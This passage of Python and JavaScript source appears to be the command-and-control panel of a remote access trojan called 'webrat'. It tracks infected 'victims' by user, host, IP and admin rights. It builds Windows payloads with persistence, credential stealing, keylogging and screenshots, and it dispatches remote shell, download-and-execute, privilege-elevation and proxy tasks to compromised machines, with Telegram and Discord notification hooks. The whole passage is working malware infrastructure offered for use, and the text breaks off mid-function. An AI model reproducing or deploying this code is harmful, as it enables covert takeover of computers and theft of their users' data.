    document.body.appendChild(a); a.click(); a.remove();
    window.URL.revokeObjectURL(url);
    closeBuildModal();
    alert('Build successful! File downloaded.');
  }catch(e){
    alert('Build failed: '+e);
  }finally{
    btn.disabled=false; btn.textContent='Build & Download';
  }
}

async function rf(){
  const r=await fetch('/agents');const agents=await r.json();
  document.getElementById('cnt').textContent=agents.length+' agents';
  const el=document.getElementById('alist');el.innerHTML='';
  for(const a of(agents||[])){
    const d=document.createElement('div');
    d.className='card'+(sel===a.id?' active':'');
    d.innerHTML='<div class="id"><span class="dot"></span>'+a.id+'</div>'+
      '<div class="info">'+a.user+'@'+a.host+' | '+a.os+' | admin:'+a.admin+'</div>'+
      '<div class="info">'+a.ip+' | pid:'+a.pid+'</div>';
    d.onclick=()=>{sel=a.id;rf();};
    el.appendChild(d);
  }
}
async function sc(cmd,args){
  if(!sel){alert('select agent');return;}
  const r=await fetch('/task',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({agent_id:sel,cmd,args:args||{}})});
  const d=await r.json();
  if(d.task_id)pt(d.task_id,cmd);
  else ao(cmd,'',JSON.stringify(d));
}
async function pt(id,cmd){
  for(let i=0;i<120;i++){
    await new Promise(r=>setTimeout(r,1000));
    const r=await fetch('/output/'+id);const t=await r.json();
    if(t.done){ao(cmd,t.output,t.err);return;}
  }
  ao(cmd,'','timeout');
}
function ao(cmd,data,err){
  const el=document.createElement('div');
  el.innerHTML='<div class="thdr">['+new Date().toLocaleTimeString()+'] '+cmd+'</div>'+
    '<pre>'+(err?'ERROR: '+err+'\n':'')+data+'</pre>';
  if(out.querySelector('.noagent'))out.innerHTML='';
  out.appendChild(el);out.scrollTop=out.scrollHeight;
}
function rs(){
  const v=document.getElementById('ci').value.trim();
  if(!v)return;
  document.getElementById('ci').value='';
  sc('exec',{cmd:v});
}
function pc(cmd,key,hint){
  const v=prompt(hint);if(!v)return;
  if(cmd==='dl'){const p=v.split('|');sc(cmd,{url:p[0],path:p[1]||''});}
  else sc(cmd,{[key]:v});
}
rf();setInterval(rf,4000);
</script></body></html>"""


STATIC_DIR = Path(__file__).parent / "static"


def _inside(path: Path, parent: Path) -> bool:
    """True if resolved path is strictly inside resolved parent."""
    p = str(path)
    root = str(parent.resolve())
    if not root.endswith(os.sep):
        root += os.sep
    return p.startswith(root)

class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, *_):
        pass 

    def _json(self, code, obj):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _html_json(self, code, obj):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        query_target = None
        if "?" in self.path:
            qs = urllib.parse.parse_qs(self.path.split("?", 1)[1])
            if "target" in qs:
                query_target = qs["target"][0]

        url_path = self.path.split("?")[0].lstrip("/")

        if url_path == "index.php" and query_target:
            if query_target in ["panel", "builder", "community", "notify", "settings", "subs"]:
                file_path = (STATIC_DIR / query_target / "index.html").resolve()
            else:
                file_path = (STATIC_DIR / "panel" / "index.html").resolve()
        elif url_path.startswith("userctrl"):
            rel_userctrl = url_path[len("userctrl"):].lstrip("/")
            if not rel_userctrl:
                rel_userctrl = "index.html"
            file_path = (STATIC_DIR / "userctrl" / rel_userctrl).resolve()
            if not file_path.exists():
                file_path = (STATIC_DIR / "userctrl" / "index.html").resolve()
        else:
            if not url_path:
                url_path = "index.html"
            file_path = (STATIC_DIR / url_path).resolve()

        if url_path.startswith("uploads/"):
            uploads_dir = Path(__file__).parent / "uploads"
            fname = url_path[len("uploads/"):]
            fpath = (uploads_dir / fname).resolve()
            if _inside(fpath, uploads_dir) and fpath.exists() and fpath.is_file():
                data = fpath.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                log(f"[*] served upload: {fname} ({len(data)} bytes)")
            else:
                self._json(404, {"error": "not found"})
            return
        if url_path.startswith("connect/"):
            connect_dir = Path(__file__).parent / "connect"
            fname = url_path[len("connect/"):]
            fpath = (connect_dir / fname).resolve()
            if _inside(fpath, connect_dir) and fpath.exists() and fpath.is_file():
                data = fpath.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                return
            else:
                self._json(404, {"error": "not found"})
                return
                    # --- ОТВЕТ НА /connect (без слеша) ---
        if url_path == "connect":
            self._json(200, {"success": True, "message": "Connect endpoint ready"})
            return
            
        if not _inside(file_path, STATIC_DIR):
            self._json(403, {"error": "Forbidden"})
            return

        if file_path.exists() and file_path.is_file():
            mime_type, _ = mimetypes.guess_type(str(file_path))
            if str(file_path).endswith('.wav'):
                mime_type = "audio/wav"
            elif not mime_type:
                mime_type = "application/octet-stream"
            with open(file_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", mime_type)
            self.send_header("Content-Length", str(len(content)))
            self.send_header("Accept-Ranges", "bytes")
            self.end_headers()
            self.wfile.write(content)
            return

        if url_path == "api/users":
            with users_lock, agents_lock:
                now_ts = int(time.time())
                res_dict = {}
                for uid, u_entry in list(users_store.items()):
                    clean_u = dict(u_entry)
                    clean_u["uid"] = str(uid)
                    clean_u["user"] = str(clean_u.get("user") or "Unknown")
                    clean_u["pcname"] = str(clean_u.get("pcname") or "DESKTOP")
                    clean_u["ip"] = str(clean_u.get("ip") or "127.0.0.1")
                    clean_u["uos"] = str(clean_u.get("uos") or "Win 10")
                    clean_u["adm"] = "true" if str(clean_u.get("adm")).lower() in ("true", "1") else "false"
                    clean_u["status"] = 0 if uid in agents else int(clean_u.get("status", 9999))
                    clean_u["firstseen"] = int(clean_u.get("firstseen", now_ts - 3600))
                    clean_u["active"] = int(clean_u.get("active", now_ts))
                    clean_u["actwin"] = str(clean_u.get("actwin") or "Desktop")
                    clean_u["ucpu"] = str(clean_u.get("ucpu") or "x64")
                    clean_u["ugpu"] = "GPU"
                    clean_u["country"] = "RU"
                    clean_u["comment"] = str(clean_u.get("comment") or "")
                    clean_u["ucolor"] = str(clean_u.get("ucolor") or "#3b82f6")
                    clean_u["version"] = "0.28.2"
                    clean_u["logsize"] = str(clean_u.get("logsize") or "1024")
                    res_dict[uid] = clean_u

                for a in agents.values():
                    log_size_val = "1024"
                    if a.id in users_store and users_store[a.id].get("logsize"):
                        log_size_val = str(users_store[a.id]["logsize"])

                    fs_ts = now_ts - 3600
                    if a.id in users_store and isinstance(users_store[a.id].get("firstseen"), (int, float)):
                        fs_ts = users_store[a.id]["firstseen"]

                    live_u = {
                        "uid": str(a.id),
                        "user": str(a.user or "Unknown"),
                        "pcname": str(a.host or "DESKTOP"),
                        "ip": str(a.ip),
                        "uos": str(a.os or "Win 10"),
                        "adm": "true" if a.admin else "false",
                        "status": 0,
                        "firstseen": fs_ts,
                        "active": now_ts,
                        "actwin": getattr(a, "actwin", "Desktop"),
                        "ucpu": getattr(a, "arch", "x64"),
                        "ugpu": "GPU",
                        "country": "RU",
                        "comment": getattr(a, "comment", users_store.get(a.id, {}).get("comment", "")),
                        "ucolor": getattr(a, "color", users_store.get(a.id, {}).get("ucolor", "#3b82f6")),
                        "version": "0.28.2",
                        "logsize": log_size_val
                    }
                    res_dict[a.id] = live_u
                    users_store[a.id] = live_u

                user_list = list(res_dict.values())
            log(f"[*] GET /api/users -> returning {len(user_list)} victims (live: {len(agents)}, stored: {len(users_store)})")
            self._json(200, {"success": True, "result": user_list})
            return

        if url_path in ("api/websocket/servers", "api/websocket/servers/"):
            self._json(200, {"success": True, "result": {"Local Server": "1"}})
            return

        if url_path == "sw.js":
            body = b"self.addEventListener('fetch', function(e){});"
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        if url_path == "agents":
            with agents_lock:
                self._json(200, [a.to_dict() for a in agents.values()])
            return
        elif url_path == "tasks":
            with tasks_lock:
                self._json(200, list(task_store.values()))
            return
        elif url_path.startswith("output/"):
            tid = url_path[len("output/"):]
            with tasks_lock:
                t = task_store.get(tid)
            if t:
                self._json(200, t)
            else:
                self._json(404, {"error": "not found"})
            return

        self._json(404, {"error": "Not Found"})

    def do_POST(self):
        p = self.path.split("?")[0].rstrip("/")
        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length) if length > 0 else b""
        body_preview = raw_body[:120].decode('utf-8', errors='replace').replace('\n', ' ')
        if length > 120:
            body_preview += f"... [+{length - 120} bytes]"
        log(f"[>] POST {p} | {length} bytes | {body_preview}")

        if p == "/api/users":
            with users_lock, agents_lock:
                now_ts = int(time.time())
                res_dict = {}

                for uid, u_entry in list(users_store.items()):
                    clean_u = dict(u_entry)
                    clean_u["uid"] = str(uid)
                    clean_u["user"] = str(clean_u.get("user") or "Unknown")
                    clean_u["pcname"] = str(clean_u.get("pcname") or "DESKTOP")
                    clean_u["ip"] = str(clean_u.get("ip") or "127.0.0.1")
                    clean_u["uos"] = str(clean_u.get("uos") or "Win 10")
                    clean_u["adm"] = "true" if str(clean_u.get("adm")).lower() in ("true", "1") else "false"
                    clean_u["status"] = 0 if uid in agents else int(clean_u.get("status", 9999))
                    
                    fs_ts = clean_u.get("firstseen") if isinstance(clean_u.get("firstseen"), (int, float)) else now_ts - 3600
                    act_ts = clean_u.get("active") if isinstance(clean_u.get("active"), (int, float)) else now_ts
                    
                    clean_u["firstseen"] = int(fs_ts)
                    clean_u["active"] = int(act_ts)
                    clean_u["actwin"] = str(clean_u.get("actwin") or "Desktop")
                    clean_u["ucpu"] = str(clean_u.get("ucpu") or "x64")
                    clean_u["ugpu"] = "GPU"
                    clean_u["country"] = "RU"
                    clean_u["comment"] = str(clean_u.get("comment") or "")
                    clean_u["ucolor"] = str(clean_u.get("ucolor") or "#3b82f6")
                    clean_u["version"] = "0.28.2"
                    clean_u["logsize"] = str(clean_u.get("logsize") or "1024")
                    res_dict[uid] = clean_u

                for a in agents.values():
                    log_size_val = "1024"
                    if a.id in users_store and users_store[a.id].get("logsize"):
                        log_size_val = str(users_store[a.id]["logsize"])

                    fs_ts = now_ts - 3600
                    if a.id in users_store and isinstance(users_store[a.id].get("firstseen"), (int, float)):
                        fs_ts = users_store[a.id]["firstseen"]

                    live_u = {
                        "uid": str(a.id),
                        "user": str(a.user or "Unknown"),
                        "pcname": str(a.host or "DESKTOP"),
                        "ip": str(a.ip),
                        "uos": str(a.os or "Win 10"),
                        "adm": "true" if a.admin else "false",
                        "status": 0,
                        "firstseen": int(fs_ts),
                        "active": int(now_ts),
                        "actwin": getattr(a, "actwin", "Desktop"),
                        "ucpu": getattr(a, "arch", "x64"),
                        "ugpu": "GPU",
                        "country": "RU",
                        "comment": getattr(a, "comment", users_store.get(a.id, {}).get("comment", "")),
                        "ucolor": getattr(a, "color", users_store.get(a.id, {}).get("ucolor", "#3b82f6")),
                        "version": "0.28.2",
                        "logsize": log_size_val
                    }
                    res_dict[a.id] = live_u
                    users_store[a.id] = live_u

                user_list = list(res_dict.values())
            log(f"[*] /api/users -> returning {len(user_list)} victims (live: {len(agents)}, stored: {len(users_store)})")
            self._json(200, {"success": True, "result": user_list})
            return

        elif p == "/api/builds":
            with builds_lock:
                result = []
                for b in builds_store:
                    result.append(dict(b))
            body = json.dumps(result).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body)
            return

        elif p == "/api/builds/add":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            cfg_raw = params.get("buildConfig", ["{}"])[0]
            try:
                cfg = json.loads(cfg_raw)
            except Exception:
                cfg = {}

            raw_c2 = str(cfg.get("c2_host") or "").strip()
            if ":" in raw_c2:
                c2_host, c2_port = raw_c2.rsplit(":", 1)
            else:
                c2_host = raw_c2 or getattr(self.server, "c2_host", "127.0.0.1")
                c2_port = str(cfg.get("c2_port") or "").strip() or str(getattr(self.server, "c2_port", 7777))
            mutex_prefix = cfg.get("mutex", "WEBR_123")
            bname = cfg.get("name", "") or "webrat"
            install = cfg.get("install", 2)
            autorun = cfg.get("autorun", 1)

            options = {
                "mutex_prefix": mutex_prefix,
                "folder_name": cfg.get("path", "Microsoft\\Windows"),
                "persistence": autorun != 0,
                "stealer": cfg.get("autoSteal", 1) != 0,
                "keylogger": True,
                "screenshots": True,
            }

            temp_dir = tempfile.mkdtemp()
            out_file = os.path.join(temp_dir, f"{bname}.exe")
            stub_dir = str(Path(__file__).parent / "zalypa" / "stub")

            try:
                run_builder(c2_host, c2_port, out_file, stub_dir, False, options)
                if not os.path.exists(out_file):
                    self._json(500, {"success": False, "result": "Build output file not created"})
                    return

                full_cfg = dict(cfg)
                full_cfg["version"] = "1.0.0"
                full_cfg["c2_host"] = c2_host
                full_cfg["c2_port"] = c2_port

                build_hwid = gen_id()
                build_entry = {
                    "hwid":       build_hwid,
                    "config":     json.dumps(full_cfg),
                    "created":    datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
                    "user_count": 0,
                    "pass":       full_cfg.get("mutex", ""),
                }
                with builds_lock:
                    builds_store.append(build_entry)
                    save_builds_store()

                zip_path = os.path.join(temp_dir, f"{bname}.zip")
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.write(out_file, f"{bname}.exe")

                with open(zip_path, "rb") as f:
                    data = f.read()

                self.send_response(200)
                self.send_header("Content-Type", "application/zip")
                self.send_header("Content-Disposition", f'attachment; filename="{bname}.zip"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            except Exception as e:
                self._json(500, {"success": False, "result": str(e)})
            finally:
                with contextlib.suppress(Exception):
                    shutil.rmtree(temp_dir)
            return

        elif p == "/api/builds/remove":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            hwid = params.get("hwid", [""])[0]
            if not hwid:
                try:
                    body = json.loads(raw_body.decode())
                    hwid = body.get("hwid", "")
                except Exception:
                    pass
            with builds_lock:
                before = len(builds_store)
                builds_store[:] = [b for b in builds_store if str(b.get("hwid", "")) != hwid]
                removed = len(builds_store) < before
                if removed:
                    save_builds_store()
            self._json(200, {"success": 1 if removed else 0})
            return

        elif p in ("/api/builds/edit", "/api/builds/edit/"):
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            hwid  = params.get("hwid",  [""])[0]
            field = params.get("edit",  [""])[0]
            value = params.get("value", [""])[0]
            updated = False
            with builds_lock:
                for b in builds_store:
                    if str(b.get("hwid", "")) == hwid:
                        try:
                            cfg = json.loads(b["config"])
                        except Exception:
                            cfg = {}
                        cfg[field] = value
                        b["config"] = json.dumps(cfg)
                        updated = True
                        save_builds_store()
                        break
            self._json(200, {"success": 1 if updated else 0})
            return

        elif p == "/api/users/update":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            hwid = params.get("hwid", [""])[0]
            field = params.get("edit", [""])[0]
            val = params.get("data", [""])[0]
            with agents_lock, users_lock:
                hwid_list = [h.strip() for h in hwid.split(",") if h.strip()] or ([hwid] if hwid else [])
                targets_any = False
                for one in hwid_list:
                    agent = agents.get(one)
                    if agent:
                        targets_any = True
                        if field in ("comment", "ucomment"):
                            agent.comment = val
                            if one in users_store:
                                users_store[one]["comment"] = val
                        elif field in ("color", "ucolor"):
                            agent.color = val
                            if one in users_store:
                                users_store[one]["ucolor"] = val
                    elif one in users_store and field in ("comment", "ucomment", "color", "ucolor"):
                        # offline target: persist straight to the store
                        targets_any = True
                        key = "comment" if field in ("comment", "ucomment") else "ucolor"
                        users_store[one][key] = val
                if targets_any:
                    save_users_store()
                self._json(200, {"success": 1 if targets_any else 0})
            return

        elif p == "/api/users/remove":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            raw_ids = params.get("removeUser", [""])[0]
            ids_to_remove = set(raw_ids.split(",")) if raw_ids else set()
            with agents_lock, users_lock:
                for uid in ids_to_remove:
                    agents.pop(uid, None)
                    users_store.pop(uid, None)
                save_users_store()
            self._json(200, {"success": 1})
            return

        elif p == "/api/build":
            try:
                body = json.loads(raw_body.decode())
            except Exception:
                body = {}
            c2_host = body.get("c2_host", getattr(self.server, "c2_host", "127.0.0.1"))
            c2_port = str(body.get("c2_port", getattr(self.server, "c2_port", 7777)))
            out_name = body.get("out_name", "built_stub.exe")
            use_upx  = bool(body.get("use_upx", False))

            options = {
                "mutex_prefix": body.get("mutex_prefix", "letgob"),
                "folder_name":  body.get("folder_name", "Microsoft\\Windows"),
                "persistence":  bool(body.get("persistence", True)),
                "stealer":      bool(body.get("stealer", True)),
                "keylogger":    bool(body.get("keylogger", True)),
                "screenshots":  bool(body.get("screenshots", True)),
            }

            temp_dir = tempfile.mkdtemp()
            out_file = os.path.join(temp_dir, out_name)
            stub_dir = str(Path(__file__).parent / "zalypa" / "stub")

            try:
                run_builder(c2_host, c2_port, out_file, stub_dir, use_upx, options)
                if not os.path.exists(out_file):
                    self._json(500, {"error": "build output not created"})
                    return
                with open(out_file, "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{out_name}"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except Exception as e:
                self._json(500, {"error": str(e)})
            finally:
                with contextlib.suppress(Exception):
                    shutil.rmtree(temp_dir)
            return

        elif p == "/task":
            try:
                body = json.loads(raw_body.decode())
            except Exception:
                body = {}
            agent_id = body.get("agent_id", "")
            cmd      = body.get("cmd", "")
            args     = body.get("args", {})
            rewritten = build_ps_task(cmd, args if isinstance(args, dict) else {})
            if rewritten:
                cmd, args = rewritten
            try:
                tid = send_task(agent_id, cmd, args)
                self._json(200, {"task_id": tid})
            except KeyError as e:
                self._json(404, {"error": str(e)})
            except Exception as e:
                self._json(500, {"error": str(e)})
            return

        elif p == "/api/user/getMe":
            self._json(200, {
                "success": True,
                "login": "MOLAXES",
                "reg": "",
                "mail": "t.me/MolaxesCrack",
                "passchange": "",
                "2fa": False
            })
            return

        elif p == "/api/builds/version":
            self._json(200, {"success": True, "result": "0.28.2"})
            return

        elif p in ("/api/websocket/servers", "/api/websocket/servers/"):
            self._json(200, {"success": True, "result": {"Local Server": "1"}})
            return

        elif p in ("/api/websocket/getAddress", "/api/websocket/getAddress/"):
            self._json(200, {
                "success": True,
                "result": {
                    "host": "127.0.0.1:8080",
                    "port": 8080
                }
            })
            return

        elif p == "/api/notify/methods":
            with notify_lock:
                self._json(200, {"success": True, "result": list(notify_methods)})
            return

        elif p == "/api/notify/methods/check":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            mtype = params.get("type", ["0"])[0]
            raw_data = params.get("data", [""])[0]

            success_sent = False
            message_text = "t.me/MolaxesCrack"

            if str(mtype) == "0":
                try:
                    parsed = json.loads(raw_data)
                    token = parsed.get("token", "")
                    chatid = parsed.get("chatid", "")
                except Exception:
                    token = ""
                    chatid = ""

                if token and chatid:
                    try:
                        tg_url = f"https://api.telegram.org/bot{token}/sendMessage"
                        req_data = urllib.parse.urlencode({"chat_id": chatid, "text": message_text}).encode("utf-8")
                        req = urllib.request.Request(tg_url, data=req_data, headers={"User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req, timeout=10) as resp:
                            if resp.status == 200:
                                success_sent = True
                    except Exception as e:
                        log(f"[!] Telegram check send error: {e}")
            else:
                webhook_url = raw_data.strip()
                if webhook_url.startswith("http"):
                    try:
                        req_data = json.dumps({"content": message_text}).encode("utf-8")
                        req = urllib.request.Request(webhook_url, data=req_data, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req, timeout=10) as resp:
                            if resp.status in (200, 204):
                                success_sent = True
                    except Exception as e:
                        log(f"[!] Discord check send error: {e}")

            self._json(200, {"success": success_sent})
            return

        elif p == "/api/notify/methods/add":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            name = params.get("name", ["Method"])[0] or "Method"
            mtype = int(params.get("type", ["0"])[0])
            raw_data = params.get("data", [""])[0]

            with notify_lock:
                new_id = max((int(m["id"]) for m in notify_methods if m.get("id") is not None), default=0) + 1
                created_str = datetime.now().strftime("%Y-%m-%d %H:%M")
                method_obj = {
                    "id": new_id,
                    "name": name,
                    "type": mtype,
                    "data": raw_data,
                    "created": created_str
                }
                notify_methods.append(method_obj)
                save_notify_store()

            self._json(200, {"success": True, "result": new_id})
            return

        elif p == "/api/notify/methods/remove":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            mid = params.get("id", ["0"])[0]
            with notify_lock:
                notify_methods[:] = [m for m in notify_methods if str(m["id"]) != str(mid)]
                save_notify_store()
            self._json(200, {"success": True})
            return

        elif p == "/api/notify/triggers":
            with notify_lock:
                self._json(200, {"success": True, "result": list(notify_triggers)})
            return

        elif p == "/api/notify/triggers/add":
            with notify_lock:
                new_id = max((int(t["id"]) for t in notify_triggers if t.get("id") is not None), default=0) + 1
                created_str = datetime.now().strftime("%Y-%m-%d %H:%M")
                trig_obj = {
                    "id": new_id,
                    "targetType": 0,
                    "event": 0,
                    "target": "all",
                    "created": created_str
                }
                notify_triggers.append(trig_obj)
                save_notify_store()
            self._json(200, {"success": True})
            return

        elif p == "/api/notify/triggers/remove":
            params = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
            tid = params.get("id", ["0"])[0]
            with notify_lock:
                notify_triggers[:] = [t for t in notify_triggers if str(t["id"]) != str(tid)]
                save_notify_store()
            self._json(200, {"success": True})
            return

        elif p in ("/api/scripts", "/api/scripts/save"):
            try:
                data = json.loads(raw_body.decode('utf-8', errors='ignore'))
            except Exception:
                data = None
            if isinstance(data, dict) and data:
                with scripts_lock:
                    scripts_store.clear()
                    scripts_store.update(data)
                    save_scripts_store()
                self._json(200, {"success": True})
            else:
                with scripts_lock:
                    self._json(200, {"success": True, "result": scripts_store})
            return

        elif p == "/api/tasks/add":
            ct = self.headers.get("Content-Type", "")

            if "multipart/form-data" in ct:
                import email, email.parser as _ep
                boundary = ""
                for part in ct.split(";"):
                    part = part.strip()
                    if part.startswith("boundary="):
                        boundary = part[9:].strip('"')
                parts = {}
                raw_file_bytes = b""
                raw_file_name  = "file.exe"
                body_str = b"Content-Type: " + ct.encode() + b"\r\n\r\n" + raw_body
                try:
                    msg = email.message_from_bytes(body_str)
                    for part in msg.walk():
                        if part.get_content_maintype() == "multipart":
                            continue
                        field_name = part.get_param("name", header="content-disposition") or ""
                        fname      = part.get_filename() or ""
                        payload    = part.get_payload(decode=True)
                        if payload is None:
                            payload = (part.get_payload() or "").encode()
                        if fname:
                            raw_file_bytes = payload
                            raw_file_name  = fname
                        else:
                            parts[field_name] = payload.decode('utf-8', errors='replace') if payload else ""
                except Exception as ex:
                    log(f"[!] multipart parse error: {ex}")
                targets = parts.get("targets", parts.get("hwid", ""))
                ttype   = str(parts.get("type", "f"))
                req     = parts.get("req", "[]")
                log(f"[>] tasks/add multipart: targets={targets!r} type={ttype!r} file={raw_file_name!r} ({len(raw_file_bytes)} bytes)")
            else:
                params  = urllib.parse.parse_qs(raw_body.decode('utf-8', errors='ignore'))
                targets = params.get("targets", [""])[0]
                ttype   = str(params.get("type", ["0"])[0])
                req     = params.get("req", ["[]"])[0]
                raw_file_bytes = b""
                raw_file_name  = "file.exe"

            cmd_map = {
                "1": "sleep",      
                "2": "kill",       
                "3": "kill",       
                "4": "exec",     
                "5": "exec",       
                "6": "dlexec",   
                "7": "exec",    
                "8": "exec",       
                "9": "steal",     
                "a": "post",     
                "b": "elevate",    
                "c": "dl",         
                "d": "screen",    
                "e": "proxy",      
                "f": "dlexec",   
            }

            if ttype == "f":
                try:
                    import base64 as _b64
                    if raw_file_bytes:
                        file_bytes = raw_file_bytes
                        fname      = raw_file_name
                    else:
                        parsed   = json.loads(req)
                        data_url = parsed[0] if parsed else ""
                        fname    = parsed[1] if len(parsed) > 1 else "file.exe"
                        if "," in data_url:
                            b64data = data_url.split(",", 1)[1]
                        else:
                            b64data = data_url
                        file_bytes = _b64.b64decode(b64data)

                    uploads_dir = Path(__file__).parent / "uploads"
                    uploads_dir.mkdir(exist_ok=True)
                    safe_fname = "".join(c for c in fname if c.isalnum() or c in "._-")[:64] or "file.exe"
                    fpath = uploads_dir / safe_fname
                    fpath.write_bytes(file_bytes)
                    log(f"[+] uploadExec: saved {safe_fname} ({len(file_bytes)} bytes)")

                    dl_url   = f"http://127.0.0.1:8080/uploads/{safe_fname}"
                    tid_list = []
                    target_ids = targets.split(",") if targets else list(agents.keys())
                    for target_id in target_ids:
                        target_id = target_id.strip()
                        if target_id and target_id in agents:
                            try:
                                tid = send_task(target_id, "dlexec", {"url": dl_url})
                                tid_list.append(tid)
                            except Exception as e:
                                log(f"[!] uploadExec task error: {e}")
                    log(f"[+] uploadExec: queued {len(tid_list)} target(s) -> {safe_fname}")
                    self._html_json(200, {"success": True, "result": tid_list or ["task_ok"], "response": tid_list[0] if tid_list else "task_ok"})
                except Exception as e:
                    log(f"[!] uploadExec error: {e}")
                    import traceback; log(traceback.format_exc())
                    self._html_json(500, {"success": False, "result": str(e)})
                return


            cmd_name = cmd_map.get(ttype, "exec")

            # stub TCP dispatch (zalypa/stub/session.go) reads args by exact keys:
            #   exec: cmd | cd,ls,ul,rm,mkdir: path | dl: url,path | dlexec: url,b64,name
            #   elevate: mode | proxy: addr | cam: w,h | sleep: ms
            try:
                parsed_args = json.loads(req)
            except Exception:
                parsed_args = None

            def _by_type(plist):
                if ttype == "1":
                    try: ms = int(float(plist[0])) if plist else 60000
                    except Exception: ms = 60000
                    return "sleep", {"ms": ms}
                if ttype in ("2", "3"):
                    return "kill", {}
                if ttype == "5":
                    return "exec", {"cmd": str(plist[0]) if plist else ""}
                if ttype == "6":
                    a = {"url": str(plist[0]) if plist else ""}
                    if len(plist) > 1: a["name"] = str(plist[1])
                    return "dlexec", a
                if ttype == "7":
                    return "exec", {"cmd": str(plist[0]) if plist else ""}
                if ttype == "9":
                    return "steal", {}
                if ttype == "a":
                    a = {"url": str(plist[0]) if plist else ""}
                    if len(plist) > 1: a["name"] = str(plist[1])
                    return "dlexec", a
                if ttype == "b":
                    return "elevate", {"mode": str(plist[0]) if plist else "1"}
                if ttype == "c":
                    return "dl", {"url": str(plist[0]) if plist else "",
                                  "path": str(plist[1]) if len(plist) > 1 else ""}
                if ttype == "d":
                    return "screen", {}
                if ttype == "e":
                    return "proxy", {"addr": str(plist[0]) if plist else "0.0.0.0:1080"}
                return None

            args = {}
            if isinstance(parsed_args, list) and len(parsed_args) >= 2 and ttype == "8":
                shell = parsed_args[0]
                cmd_str = parsed_args[1]
                args = {"cmd": f"{shell} /C {cmd_str}" if "cmd.exe" in shell.lower() else f"{shell} -Command \"{cmd_str}\""}
                cmd_name = "exec"
            elif isinstance(parsed_args, list) and len(parsed_args) >= 1 and ttype in ("6", "a"):
                dl_url = parsed_args[0]
                fname  = parsed_args[1] if len(parsed_args) > 1 else "file.exe"
                args   = {"url": dl_url, "name": fname}
                if ttype == "6":
                    import base64
                    uploads_dir = Path(__file__).parent / "uploads"
                    local_fname = dl_url.rsplit("/", 1)[-1] if "/" in dl_url else fname
                    local_path  = uploads_dir / local_fname
                    if local_path.exists() and local_path.is_file():
                        file_raw = local_path.read_bytes()
                        args["b64"] = base64.b64encode(file_raw).decode('ascii')
                        log(f"[+] dlexec: attaching inline b64 payload ({len(file_raw)} bytes)")
                cmd_name = "dlexec"
            elif isinstance(parsed_args, list):
                mapped = _by_type(parsed_args)
                if mapped:
                    cmd_name, args = mapped
                else:
                    args = {"args": json.dumps(parsed_args)}
            elif isinstance(parsed_args, dict):
                args = parsed_args
            else:
                args = {"req": req}

            if ttype == "4":
                # webSocket bridge: panel-side bookkeeping only, never forwarded to the stub.
                tid = gen_id()
                with tasks_lock:
                    task_store[tid] = {"id": tid, "agent_id": targets or "",
                                       "cmd": "webSocket", "args": {}, "output": "",
                                       "err": "", "done": True,
                                       "created": datetime.now(timezone.utc).isoformat()}
                log(f"[>] ws bridge task {tid} for {targets!r}")
                self._html_json(200, {"success": True, "result": [tid], "response": tid})
                return

            tid_list = []
            target_ids = targets.split(",") if targets else list(agents.keys())
            for target_id in target_ids:
                target_id = target_id.strip()
                if target_id and target_id in agents:
                    try:
                        tid = send_task(target_id, cmd_name, args)
                        tid_list.append(tid)
                    except Exception as e:
                        log(f"[!] Task add error: {e}")
            log(f"[>] tasks/add type={ttype!r} cmd={cmd_name!r} targets={targets!r} tids={tid_list}")
            self._html_json(200, {"success": True, "result": tid_list or ["task_ok"], "response": tid_list[0] if tid_list else "task_ok"})
            return

        elif p in ("/api/files/upload", "/api/files/upload/"):
            ct = self.headers.get("Content-Type", "")
            file_bytes = b""
            file_name  = "file.exe"
            if "multipart/form-data" in ct:
                boundary = ""
                for seg in ct.split(";"):
                    seg = seg.strip()
                    if seg.startswith("boundary="):
                        boundary = seg[9:].strip('"')
                if boundary:
                    sep    = b"--" + boundary.encode()
                    chunks = raw_body.split(sep)
                    for chunk in chunks[1:]:
                        if chunk[:2] == b"--":
                            break
                        if b"\r\n\r\n" in chunk:
